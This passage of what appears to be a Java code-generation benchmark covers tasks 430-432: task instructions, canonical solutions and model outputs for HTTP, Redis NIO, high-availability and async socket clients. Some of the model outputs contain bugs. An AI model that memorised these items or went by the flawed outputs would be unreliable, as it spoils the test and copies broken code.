DeviceDto.class);\n\t\t\t\t\treturn requestVaultMasterkey(device.userPrivateKey);\n\t\t\t\t}\n\t\t\t\tdefault -> throw new IllegalStateException(\"Unexpected response \" + response.statusCode());\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\tthrow new UncheckedIOException(e);\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestVaultMasterkey(String encryptedUserKey) {\n\t\tvar vaultKeyUri = hubConfig.URIs.API.resolve(\"vaults/\" + vaultId + \"/access-token\");\n\t\tvar request = HttpRequest.newBuilder(vaultKeyUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenApply(response -> handleVaultMasterkeyResponse(encryptedUserKey, response))\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate ReceivedKey handleVaultMasterkeyResponse(String encryptedUserKey, HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\tif (response.statusCode() == 200) {\n\t\t\ttry {\n\t\t\t\tvar vaultKeyJwe = JWEObject.parse(response.body());\n\t\t\t\tvar userKeyJwe = JWEObject.parse(encryptedUserKey);\n\t\t\t\treturn ReceivedKey.vaultKeyAndUserKey(vaultKeyJwe, userKeyJwe);\n\t\t\t} catch (ParseException e) {\n\t\t\t\tthrow new RuntimeException(e);\n\t\t\t}\n\t\t} else {\n\t\t\tthrow new IllegalStateException(\"Unexpected response \" + response.statusCode());\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestLegacyAccessToken() {\n\t\tvar legacyAccessTokenUri = hubConfig.URIs.API.resolve(\"vaults/\" + vaultId + \"/keys/\" + deviceId);\n\t\tvar request = HttpRequest.newBuilder(legacyAccessTokenUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenApply(this::handleLegacyAccessTokenResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate ReceivedKey handleLegacyAccessTokenResponse(HttpResponse<String> response) {\n\t\ttry {\n\t\t\tif (response.statusCode() == 200) {\n\t\t\t\tvar token = JWEObject.parse(response.body());\n\t\t\t\treturn ReceivedKey.legacyDeviceKey(token);\n\t\t\t} else {\n\t\t\t\tthrow new IOException(\"Unexpected response \" + response.statusCode());\n\t\t\t}\n\t\t} catch (IOException | ParseException e) {\n\t\t\tthrow new UncheckedIOException(e instanceof IOException ? (IOException) e : new IOException(e));\n\t\t}\n\t}\n\n\tprivate ReceivedKey retrievalFailed(Throwable cause) {\n\t\tthrow new RuntimeException(cause);\n\t}\n\n\t@JsonIgnoreProperties(ignoreUnknown = true)\n\tprivate record DeviceDto(@JsonProperty(value = \"userPrivateKey\", required = true) String userPrivateKey) {}\n\n\t@JsonIgnoreProperties(ignoreUnknown = true)\n\tprivate record ConfigDto(@JsonProperty(value = \"apiLevel\") int apiLevel) {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "```java\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\n\npublic class HubHttpClient {\n    private final HttpClient httpClient;\n    private final String bearerToken;\n    private final HubConfig hubConfig;\n    private final String deviceId;\n    private final String vaultId;\n\n    public HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId) {\n        this.httpClient = HttpClient.newBuilder()\n                .executor(executor)\n                .build();\n        this.bearerToken = bearerToken;\n        this.hubConfig = hubConfig;\n        this.deviceId = deviceId;\n        this.vaultId = vaultId;\n    }\n\n    public CompletableFuture<ReceivedKey> requestApiConfig() {\n        return makeGetRequest(hubConfig.getApiConfigUri())\n                .thenApply(this::handleApiConfigResponse);\n    }\n\n    private CompletableFuture<ReceivedKey> handleApiConfigResponse(HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            return requestDeviceData();\n        } else if (response.statusCode() == 401) {\n            return requestLegacyAccessToken();\n        } else {\n            return CompletableFuture.failedFuture(new RuntimeException(\"API config request failed: \" + response.body()));\n        }\n    }\n\n    public CompletableFuture<ReceivedKey> requestDeviceData() {\n        return makeGetRequest(hubConfig.getDeviceDataUri())\n                .thenApply(this::handleDeviceDataResponse);\n    }\n\n    private CompletableFuture<ReceivedKey> handleDeviceDataResponse(HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            return requestVaultMasterkey(\"encryptedUserKey\");\n        } else {\n            return CompletableFuture.failedFuture(new RuntimeException(\"Device data request failed: \" + response.body()));\n        }\n    }\n\n    public CompletableFuture<ReceivedKey> requestVaultMasterkey(String encryptedUserKey) {\n        return makePostRequest(hubConfig.getVaultMasterkeyUri(), encryptedUserKey)\n                .thenApply(r -> handleVaultMasterkeyResponse(encryptedUserKey, r));\n    }\n\n    private ReceivedKey handleVaultMasterkeyResponse(String encryptedUserKey, HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            return new ReceivedKey(encryptedUserKey, response.body());\n        } else {\n            return retrievalFailed(new RuntimeException(\"Vault master key request failed: \" + response.body()));\n        }\n    }\n\n    public CompletableFuture<ReceivedKey> requestLegacyAccessToken() {\n        return makePostRequest(hubConfig.getLegacyTokenUri(), \"{}\")\n                .thenApply(this::handleLegacyAccessTokenResponse);\n    }\n\n    private ReceivedKey handleLegacyAccessTokenResponse(HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            return new ReceivedKey(\"legacy_token\", response.body());\n        } else {\n            return retrievalFailed(new RuntimeException(\"Legacy access token request failed: \" + response.body()));\n        }\n    }\n\n    private ReceivedKey retrievalFailed(Throwable cause) {\n        return new ReceivedKey(null, null);\n    }\n\n    private CompletableFuture<HttpResponse<String>> makeGetRequest(URI uri) {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n                .header(\"Authorization\", \"Bearer \" + bearerToken)\n                .GET()\n                .build();\n        return httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    private CompletableFuture<HttpResponse<String>> makePostRequest(URI uri, String body) {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n                .header(\"Authorization\", \"Bearer \" + bearerToken)\n                .header(\"Content-Type\", \"application/json\")\n                .POST(HttpRequest.BodyPublishers.ofString(body))\n                .build();\n        return httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString());\n    }\n}\n```"
  },
  {
    "Task_id": 430,
    "Instruction": "Task Description: Implement a Java class that establishes and manages a non-blocking TCP client connection to a Redis server using Java NIO (New I/O) techniques. The class should handle connection establishment, data writing, reading, and resource cleanup.\n\nClass Description: PassiveRedisIndexer is a TCP client that connects to a Redis server using non-blocking I/O operations. It manages connection state, handles write operations through a queue, and reads server responses while efficiently managing system resources.\n\nAttributes:\n- writeQueue: Queue<ByteBuffer> - A thread-safe queue holding data buffers to be written to the server\n- ref: AtomicReference<SocketHandler> - Atomic reference to the current socket handler instance\n- conMan: NIOConnectionManager - Manages NIO channel registration and event selection\n- config: ConfigReader - Reads configuration data for server connection details\n- namespaces: Map<String,String> - Static map containing XML namespace definitions for configuration parsing\n\nMethods:\n- getAddress() -> InetAddress - Retrieves the Redis server address from configuration\n  - Input: None\n  - Output: InetAddress - The server address to connect to\n\nSocketHandler Inner Class:\n- chan: SocketChannel - The NIO channel for the TCP connection\n- awaitingWriteNotification: boolean - Flag indicating if write operations are pending\n- toWrite: ByteBuffer - Current buffer being written to the channel\n- oblivion: ByteBuffer - Buffer for reading server responses (discarded in this implementation)\n\nSocketHandler Methods:\n- open() -> void - Initializes and opens the socket channel in non-blocking mode\n  - Input: None\n  - Output: None\n- close() -> void - Cleans up resources and closes the connection\n  - Input: None\n  - Output: None\n- getChannel() -> SocketChannel - Returns the socket channel\n  - Input: None\n  - Output: SocketChannel - The managed socket channel\n- registrationEvent(NIOConnectionManager, SelectionKey) -> void - Handles channel registration events\n  - Input: manager (NIOConnectionManager), key (SelectionKey)\n  - Output: None\n- selectionEvent(SelectionKey) -> void - Handles channel I/O events (connect, read, write)\n  - Input: key (SelectionKey)\n  - Output: None\n- read() -> void - Reads data from the channel (into oblivion buffer)\n  - Input: None\n  - Output: None\n- doStateChecks(long) -> void - Performs periodic connection state checks\n  - Input: now (long) - current timestamp\n  - Output: None\n- calcInterestOps() -> int - Calculates current interest operations for the selector\n  - Input: None\n  - Output: int - Bitmask of interest operations (READ, WRITE, CONNECT)",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.SocketChannel;\nimport java.util.Map;\nimport java.util.Optional;\nimport java.util.Queue;\nimport java.util.concurrent.ConcurrentLinkedQueue;\nimport java.util.concurrent.atomic.AtomicReference;\n\nimport lbms.plugins.mldht.utils.NIOConnectionManager;\nimport lbms.plugins.mldht.utils.Selectable;\nimport the8472.utils.ConfigReader;\nimport the8472.utils.XMLUtils;\nimport the8472.utils.concurrent.SerializedTaskExecutor;\n\npublic class PassiveRedisIndexer {\n\n    private Queue<ByteBuffer> writeQueue = new ConcurrentLinkedQueue<>();\n    private AtomicReference<SocketHandler> ref = new AtomicReference<>();\n    private NIOConnectionManager conMan;\n    private ConfigReader config;\n    private static final Map<String,String> namespaces = Map.of(\"xsi\",\"http://www.w3.org/2001/XMLSchema-instance\");\n\n    class SocketHandler implements Selectable {\n        \n        SocketChannel chan;\n        volatile boolean awaitingWriteNotification = true;\n        ByteBuffer toWrite;\n        ByteBuffer oblivion = ByteBuffer.allocateDirect(4*1024);\n        \n        void open() {\n            try {\n                chan = SocketChannel.open();\n                chan.configureBlocking(false);\n                chan.connect(new InetSocketAddress(getAddress(),6379));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            \n            conMan.register(this);\n        }\n        \n        void close() {\n            writeQueue.clear();\n            ref.compareAndSet(this, null);\n            try {\n                chan.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    \n        @Override\n        public SocketChannel getChannel() {\n            return chan;\n        }\n    \n        @Override\n        public void registrationEvent(NIOConnectionManager manager, SelectionKey key) throws IOException {}\n        \n        @Override\n        public void selectionEvent(SelectionKey key) throws IOException {\n            if(key.isValid() && key.isConnectable()) {\n                chan.finishConnect();\n                conMan.interestOpsChanged(this);\n            }\n                \n            if(key.isValid() && key.isReadable())\n                read();\n            if(key.isValid() && key.isWritable()) {\n                awaitingWriteNotification = false;\n                tryWrite.run();\n                conMan.interestOpsChanged(this);\n            }\n        }\n        \n        Runnable tryWrite = SerializedTaskExecutor.onceMore(() -> {\n            while(!awaitingWriteNotification && !writeQueue.isEmpty()) {\n                if(toWrite == null)\n                    toWrite = writeQueue.poll();\n                if(toWrite == null)\n                    continue;\n                \n                int written = 0;\n                try {\n                    written = chan.write(toWrite);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n                \n                if(written < 0) {\n                    awaitingWriteNotification = true;\n                    close();\n                    continue;\n                }\n                \n                if(toWrite.remaining() > 0) {\n                    awaitingWriteNotification = true;\n                    conMan.interestOpsChanged(this);\n                } else {\n                    toWrite = null;\n                }\n            }\n        });\n        \n        void read() throws IOException {\n            while(true) {\n                oblivion.clear();\n                int read = chan.read(oblivion);\n                if(read < 0)\n                    close();\n                if(read <= 0)\n                    break;\n            }\n        }\n    \n        @Override\n        public void doStateChecks(long now) throws IOException {\n            if(!chan.isOpen()) {\n                close();\n                conMan.deRegister(this);\n            }\n        }\n    \n        @Override\n        public int calcInterestOps() {\n            int ops = SelectionKey.OP_READ;\n            \n            if(chan.isConnectionPending())\n                ops |= SelectionKey.OP_CONNECT;\n            \n            if(awaitingWriteNotification)\n                ops |= SelectionKey.OP_WRITE;\n                \n            return ops;\n        }\n    }\n\n    private InetAddress getAddress() {\n        return config.get(XMLUtils.buildXPath(\"//components/component[@xsi:type='mldht:redisIndexerType']/address\",namespaces))\n                   .flatMap(str -> Optional.ofNullable(str))\n                   .map(str -> {\n                       try {\n                           return InetAddress.getByName(str);\n                       } catch (Exception e) {\n                           throw new RuntimeException(e);\n                       }\n                   })\n                   .get();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.SocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.Map;\nimport java.util.Queue;\nimport java.util.concurrent.ConcurrentLinkedQueue;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class PassiveRedisIndexer {\n    private final Queue<ByteBuffer> writeQueue = new ConcurrentLinkedQueue<>();\n    private final AtomicReference<SocketHandler> ref = new AtomicReference<>();\n    private final NIOConnectionManager conMan;\n    private final ConfigReader config;\n    private final Map<String, String> namespaces;\n\n    public PassiveRedisIndexer(NIOConnectionManager conMan, ConfigReader config, Map<String, String> namespaces) {\n        this.conMan = conMan;\n        this.config = config;\n        this.namespaces = namespaces;\n    }\n\n    public InetAddress getAddress() {\n        // Implementation to retrieve Redis server address from configuration\n        return InetAddress.getLoopbackAddress(); // Placeholder for actual logic\n    }\n\n    class SocketHandler {\n        private final SocketChannel chan;\n        private boolean awaitingWriteNotification = false;\n        private ByteBuffer toWrite = null;\n        private final ByteBuffer oblivion = ByteBuffer.allocate(1024);\n\n        public SocketHandler(SocketChannel chan) {\n            this.chan = chan;\n        }\n\n        public void open() throws IOException {\n            if (chan == null || !chan.isOpen()) {\n                InetAddress address = getAddress();\n                int port = 6379; // Default Redis port\n                chan = SocketChannel.open();\n                chan.configureBlocking(false);\n                chan.connect(new java.net.InetSocketAddress(address, port));\n            }\n        }\n\n        public void close() throws IOException {\n            if (chan != null && chan.isOpen()) {\n                chan.close();\n            }\n        }\n\n        public SocketChannel getChannel() {\n            return chan;\n        }\n\n        public void registrationEvent(NIOConnectionManager manager, SelectionKey key) {\n            if (key.isValid() && key.isConnectable()) {\n                try {\n                    if (chan.finishConnect()) {\n                        key.interestOps(key.interestOps() & ~SelectionKey.OP_CONNECT);\n                        key.interestOps(key.interestOps() | SelectionKey.OP_READ);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        public void selectionEvent(SelectionKey key) {\n            if (key.isReadable()) {\n                read();\n            }\n            if (key.isWritable()) {\n                doWrite();\n            }\n        }\n\n        private void doWrite() {\n            if (toWrite == null) {\n                toWrite = writeQueue.poll();\n            }\n            if (toWrite != null) {\n                try {\n                    int bytesWritten = chan.write(toWrite);\n                    if (bytesWritten > 0) {\n                        if (toWrite.remaining() == 0) {\n                            toWrite = null;\n                        }\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            } else {\n                awaitingWriteNotification = false;\n            }\n        }\n\n        public void read() {\n            try {\n                int bytesRead = chan.read(oblivion);\n                if (bytesRead < 0) {\n                    close();\n                }\n                oblivion.clear();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        public void doStateChecks(long now) {\n            // Periodic state checks can be implemented here\n        }\n\n        public int calcInterestOps() {\n            int ops = 0;\n            if (awaitingWriteNotification) {\n                ops |= SelectionKey.OP_WRITE;\n            } else {\n                ops |= SelectionKey.OP_READ;\n            }\n            return ops;\n        }\n    }\n}\n\ninterface NIOConnectionManager {\n    void register(SocketChannel channel, int interestOps);\n}\n\ninterface ConfigReader {\n    String getProperty(String key);\n}\n```"
  },
  {
    "Task_id": 431,
    "Instruction": "Task Description: Implement a Java class for a High Availability (HA) client that manages communication with a master server using non-blocking I/O (NIO) techniques. The client should handle connection management, data reporting, and read event processing.\n\nClass Description: DefaultHAClient is a service thread that maintains a connection to a master server for high availability purposes. It uses Java NIO's SocketChannel and Selector for non-blocking communication, manages buffer operations for data transfer, and handles connection lifecycle events.\n\nAttributes:\n- READ_MAX_BUFFER_SIZE: [int] - Maximum buffer size for reading data (4MB)\n- masterHaAddress: [AtomicReference<String>] - Atomic reference to the master server's address\n- reportOffset: [ByteBuffer] - Buffer for reporting slave offset to master (8 bytes)\n- socketChannel: [SocketChannel] - Channel for communication with master\n- selector: [Selector] - Selector for non-blocking I/O operations\n- lastReadTimestamp: [long] - Timestamp of last successful read operation\n- lastWriteTimestamp: [long] - Timestamp of last successful write operation\n- currentReportedOffset: [long] - Current offset reported to master\n- dispatchPosition: [int] - Position in read buffer for dispatching data\n- byteBufferRead: [ByteBuffer] - Primary buffer for reading data\n- byteBufferBackup: [ByteBuffer] - Backup buffer for buffer reallocation\n- defaultMessageStore: [DefaultMessageStore] - Reference to the message store for offset information\n\nMethods:\n- DefaultHAClient([DefaultMessageStore defaultMessageStore]) -> [void] - Constructor that initializes selector and message store reference\n- updateHaMasterAddress([String newAddr]) -> [void] - Updates the master server address atomically\n- reportSlaveMaxOffset([long maxOffset]) -> [boolean] - Reports the slave's maximum offset to master, returns success status\n- reallocateByteBuffer() -> [void] - Reallocates and swaps read buffers when needed\n- swapByteBuffer() -> [void] - Swaps primary and backup byte buffers\n- processReadEvent() -> [boolean] - Processes read events from socket channel, returns success status\n- connectMaster() -> [boolean] - Connects to master server, returns connection status\n- closeMaster() -> [void] - Closes connection with master and cleans up resources\n- shutdown() -> [void] - Shuts down the client by closing all resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.SocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ClosedChannelException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.atomic.AtomicReference;\nimport org.apache.rocketmq.common.ServiceThread;\nimport org.apache.rocketmq.common.utils.NetworkUtil;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\nimport org.apache.rocketmq.store.DefaultMessageStore;\n\npublic class DefaultHAClient extends ServiceThread implements HAClient {\n\n    private static final int READ_MAX_BUFFER_SIZE = 1024 * 1024 * 4;\n    private final AtomicReference<String> masterHaAddress = new AtomicReference<>();\n    private final ByteBuffer reportOffset = ByteBuffer.allocate(8);\n    private SocketChannel socketChannel;\n    private Selector selector;\n    private long lastReadTimestamp = System.currentTimeMillis();\n    private long lastWriteTimestamp = System.currentTimeMillis();\n    private long currentReportedOffset = 0;\n    private int dispatchPosition = 0;\n    private ByteBuffer byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private ByteBuffer byteBufferBackup = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private DefaultMessageStore defaultMessageStore;\n\n    public DefaultHAClient(DefaultMessageStore defaultMessageStore) throws IOException {\n        this.selector = NetworkUtil.openSelector();\n        this.defaultMessageStore = defaultMessageStore;\n    }\n\n    public void updateHaMasterAddress(final String newAddr) {\n        String currentAddr = this.masterHaAddress.get();\n        if (masterHaAddress.compareAndSet(currentAddr, newAddr)) {\n            log.info(\"update master ha address, OLD: \" + currentAddr + \" NEW: \" + newAddr);\n        }\n    }\n\n    private boolean reportSlaveMaxOffset(final long maxOffset) {\n        this.reportOffset.position(0);\n        this.reportOffset.limit(8);\n        this.reportOffset.putLong(maxOffset);\n        this.reportOffset.position(0);\n        this.reportOffset.limit(8);\n\n        for (int i = 0; i < 3 && this.reportOffset.hasRemaining(); i++) {\n            try {\n                this.socketChannel.write(this.reportOffset);\n            } catch (IOException e) {\n                log.error(this.getServiceName()\n                    + \"reportSlaveMaxOffset this.socketChannel.write exception\", e);\n                return false;\n            }\n        }\n        lastWriteTimestamp = this.defaultMessageStore.getSystemClock().now();\n        return !this.reportOffset.hasRemaining();\n    }\n\n    private void reallocateByteBuffer() {\n        int remain = READ_MAX_BUFFER_SIZE - this.dispatchPosition;\n        if (remain > 0) {\n            this.byteBufferRead.position(this.dispatchPosition);\n            this.byteBufferBackup.position(0);\n            this.byteBufferBackup.limit(READ_MAX_BUFFER_SIZE);\n            this.byteBufferBackup.put(this.byteBufferRead);\n        }\n\n        this.swapByteBuffer();\n        this.byteBufferRead.position(remain);\n        this.byteBufferRead.limit(READ_MAX_BUFFER_SIZE);\n        this.dispatchPosition = 0;\n    }\n\n    private void swapByteBuffer() {\n        ByteBuffer tmp = this.byteBufferRead;\n        this.byteBufferRead = this.byteBufferBackup;\n        this.byteBufferBackup = tmp;\n    }\n\n    private boolean processReadEvent() {\n        int readSizeZeroTimes = 0;\n        while (this.byteBufferRead.hasRemaining()) {\n            try {\n                int readSize = this.socketChannel.read(this.byteBufferRead);\n                if (readSize > 0) {\n                    readSizeZeroTimes = 0;\n                    boolean result = this.dispatchReadRequest();\n                    if (!result) {\n                        log.error(\"HAClient, dispatchReadRequest error\");\n                        return false;\n                    }\n                    lastReadTimestamp = System.currentTimeMillis();\n                } else if (readSize == 0) {\n                    if (++readSizeZeroTimes >= 3) {\n                        break;\n                    }\n                } else {\n                    log.info(\"HAClient, processReadEvent read socket < 0\");\n                    return false;\n                }\n            } catch (IOException e) {\n                log.info(\"HAClient, processReadEvent read socket exception\", e);\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public boolean connectMaster() throws ClosedChannelException {\n        if (null == socketChannel) {\n            String addr = this.masterHaAddress.get();\n            if (addr != null) {\n                SocketAddress socketAddress = NetworkUtil.string2SocketAddress(addr);\n                this.socketChannel = RemotingHelper.connect(socketAddress);\n                if (this.socketChannel != null) {\n                    this.socketChannel.register(this.selector, SelectionKey.OP_READ);\n                    log.info(\"HAClient connect to master {}\", addr);\n                }\n            }\n            this.currentReportedOffset = this.defaultMessageStore.getMaxPhyOffset();\n            this.lastReadTimestamp = System.currentTimeMillis();\n        }\n        return this.socketChannel != null;\n    }\n\n    public void closeMaster() {\n        if (null != this.socketChannel) {\n            try {\n                SelectionKey sk = this.socketChannel.keyFor(this.selector);\n                if (sk != null) {\n                    sk.cancel();\n                }\n                this.socketChannel.close();\n                this.socketChannel = null;\n                log.info(\"HAClient close connection with master {}\", this.masterHaAddress.get());\n            } catch (IOException e) {\n                log.warn(\"closeMaster exception. \", e);\n            }\n            this.lastReadTimestamp = 0;\n            this.dispatchPosition = 0;\n            this.byteBufferBackup.position(0);\n            this.byteBufferBackup.limit(READ_MAX_BUFFER_SIZE);\n            this.byteBufferRead.position(0);\n            this.byteBufferRead.limit(READ_MAX_BUFFER_SIZE);\n        }\n    }\n\n    @Override\n    public void shutdown() {\n        super.shutdown();\n        closeMaster();\n        try {\n            this.selector.close();\n        } catch (IOException e) {\n            log.warn(\"Close the selector of AutoRecoverHAClient error, \", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class DefaultHAClient extends ServiceThread {\n    private static final int READ_MAX_BUFFER_SIZE = 4 * 1024 * 1024;\n    private final AtomicReference<String> masterHaAddress = new AtomicReference<>();\n    private final ByteBuffer reportOffset = ByteBuffer.allocate(8);\n    private SocketChannel socketChannel;\n    private Selector selector;\n    private long lastReadTimestamp = 0;\n    private long lastWriteTimestamp = 0;\n    private long currentReportedOffset = 0;\n    private int dispatchPosition = 0;\n    private ByteBuffer byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private ByteBuffer byteBufferBackup = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private final DefaultMessageStore defaultMessageStore;\n\n    public DefaultHAClient(DefaultMessageStore defaultMessageStore) {\n        this.defaultMessageStore = defaultMessageStore;\n        try {\n            this.selector = Selector.open();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to create selector\", e);\n        }\n    }\n\n    public void updateHaMasterAddress(String newAddr) {\n        masterHaAddress.set(newAddr);\n    }\n\n    public boolean reportSlaveMaxOffset(long maxOffset) {\n        if (!this.socketChannel.isOpen()) {\n            return false;\n        }\n\n        try {\n            this.reportOffset.position(0);\n            this.reportOffset.putLong(maxOffset);\n            this.reportOffset.flip();\n            while (this.reportOffset.hasRemaining()) {\n                this.socketChannel.write(this.reportOffset);\n            }\n            this.reportOffset.clear();\n            this.lastWriteTimestamp = System.currentTimeMillis();\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    private void reallocateByteBuffer() {\n        if (byteBufferRead.remaining() < 1024) {\n            swapByteBuffer();\n        }\n    }\n\n    private void swapByteBuffer() {\n        ByteBuffer tmp = byteBufferRead;\n        byteBufferRead = byteBufferBackup;\n        byteBufferBackup = tmp;\n        byteBufferRead.clear();\n    }\n\n    public boolean processReadEvent() {\n        int readBytes = 0;\n        try {\n            readBytes = socketChannel.read(byteBufferRead);\n        } catch (IOException e) {\n            return false;\n        }\n\n        if (readBytes > 0) {\n            this.lastReadTimestamp = System.currentTimeMillis();\n            return true;\n        } else if (readBytes < 0) {\n            return false;\n        }\n\n        return true;\n    }\n\n    public boolean connectMaster() {\n        try {\n            String haAddress = this.masterHaAddress.get();\n            if (haAddress == null || haAddress.length() <= 0) {\n                return false;\n            }\n\n            String[] ipPortPair = haAddress.split(\":\");\n            InetSocketAddress address = new InetSocketAddress(ipPortPair[0], Integer.parseInt(ipPortPair[1]));\n            this.socketChannel = SocketChannel.open();\n            this.socketChannel.configureBlocking(false);\n            this.socketChannel.connect(address);\n\n            while (!this.socketChannel.finishConnect()) {\n                try {\n                    Thread.sleep(1);\n                } catch (InterruptedException ignored) {\n                }\n            }\n\n            this.socketChannel.register(this.selector, SelectionKey.OP_READ);\n            this.lastWriteTimestamp = System.currentTimeMillis();\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    public void closeMaster() {\n        if (this.socketChannel != null && this.socketChannel.isOpen()) {\n            try {\n                this.socketChannel.close();\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n    }\n\n    @Override\n    public void shutdown() {\n        super.shutdown();\n        this.closeMaster();\n        if (this.selector != null) {\n            try {\n                this.selector.wakeup();\n                this.selector.close();\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 432,
    "Instruction": "Task Description: Create a Java class that implements asynchronous TCP client functionality using java.nio channels for non-blocking network communication, with support for connection management, socket configuration, and asynchronous I/O operations.\n\nClass Description: AsynchronousSocketChannelStream is a class that provides asynchronous TCP client functionality using Java NIO's AsynchronousSocketChannel. It handles connection establishment, socket configuration, and asynchronous read/write operations with support for connection retries and error handling.\n\nAttributes:\n- serverAddress: [ServerAddress] - The target server address to connect to\n- inetAddressResolver: [InetAddressResolver] - Resolves hostnames to IP addresses\n- settings: [SocketSettings] - Configuration for socket options and timeouts\n- group: [AsynchronousChannelGroup] - Optional channel group for resource management\n\nMethods:\n- openAsync([OperationContext operationContext], [AsyncCompletionHandler<Void> handler]) -> [void] - Initiates an asynchronous connection to the server, with completion notified via handler\n- initializeSocketChannel([AsyncCompletionHandler<Void> handler], [Queue<SocketAddress> socketAddressQueue]) -> [void] - Internal method to attempt connection to a socket address\n- OpenCompletionHandler([AsyncCompletionHandler<Void> handler], [Queue<SocketAddress> socketAddressQueue], [AsynchronousSocketChannel attemptConnectionChannel]) -> [void] - Handles connection completion/failure and manages retry logic\n- AsynchronousSocketChannelAdapter([AsynchronousSocketChannel channel]) -> [void] - Wrapper class that implements ExtendedAsynchronousByteChannel interface for I/O operations\n\nThe OpenCompletionHandler nested class provides:\n- completed([Void result], [Object attachment]) -> [void] - Handles successful connection\n- failed([Throwable exc], [Object attachment]) -> [void] - Handles connection failure and manages retries\n\nThe AsynchronousSocketChannelAdapter nested class provides:\n- Various read/write methods with timeout support -> [Future/void] - Implements asynchronous I/O operations\n- isOpen() -> [boolean] - Checks if channel is open\n- close() -> [void] - Closes the channel",
    "Canonical_solution": "import com.mongodb.MongoSocketException;\nimport com.mongodb.MongoSocketOpenException;\nimport com.mongodb.ServerAddress;\nimport com.mongodb.connection.AsyncCompletionHandler;\nimport com.mongodb.connection.SocketSettings;\nimport com.mongodb.lang.Nullable;\nimport com.mongodb.spi.dns.InetAddressResolver;\n\nimport java.io.IOException;\nimport java.net.SocketAddress;\nimport java.net.StandardSocketOptions;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.AsynchronousChannelGroup;\nimport java.nio.channels.AsynchronousSocketChannel;\nimport java.nio.channels.CompletionHandler;\nimport java.util.LinkedList;\nimport java.util.Queue;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicReference;\n\nimport static com.mongodb.internal.connection.ServerAddressHelper.getSocketAddresses;\n\npublic final class AsynchronousSocketChannelStream extends AsynchronousChannelStream {\n    private final ServerAddress serverAddress;\n    private final InetAddressResolver inetAddressResolver;\n    private final SocketSettings settings;\n    @Nullable\n    private final AsynchronousChannelGroup group;\n\n    public AsynchronousSocketChannelStream(\n            final ServerAddress serverAddress, final InetAddressResolver inetAddressResolver,\n            final SocketSettings settings, final PowerOfTwoBufferPool bufferProvider,\n            @Nullable final AsynchronousChannelGroup group) {\n        super(serverAddress, settings, bufferProvider);\n        this.serverAddress = serverAddress;\n        this.inetAddressResolver = inetAddressResolver;\n      